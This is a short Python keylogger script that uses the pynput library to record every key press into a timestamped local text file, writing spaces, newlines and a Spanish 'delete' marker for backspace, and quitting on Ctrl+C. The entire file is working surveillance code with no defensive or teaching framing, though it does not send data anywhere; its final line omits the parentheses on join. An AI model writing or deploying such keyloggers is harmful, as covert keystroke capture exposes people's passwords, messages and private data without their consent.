import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")

p = open(f"keylogger_{x}.txt", "w")

def register(key):
        key = str(key)

        if key == "'\\x03'":
                p.close()
                quit()
        elif key == 'Key.enter':
            p.write('\n')
        elif key == 'Key.space':
            p.write(' ')
        elif key == 'Key.backspace':
            p.write('%BORRAR%')
        else: 
            p.write(key.replace("'",""))
with Listener(on_press = register) as u:
     u.join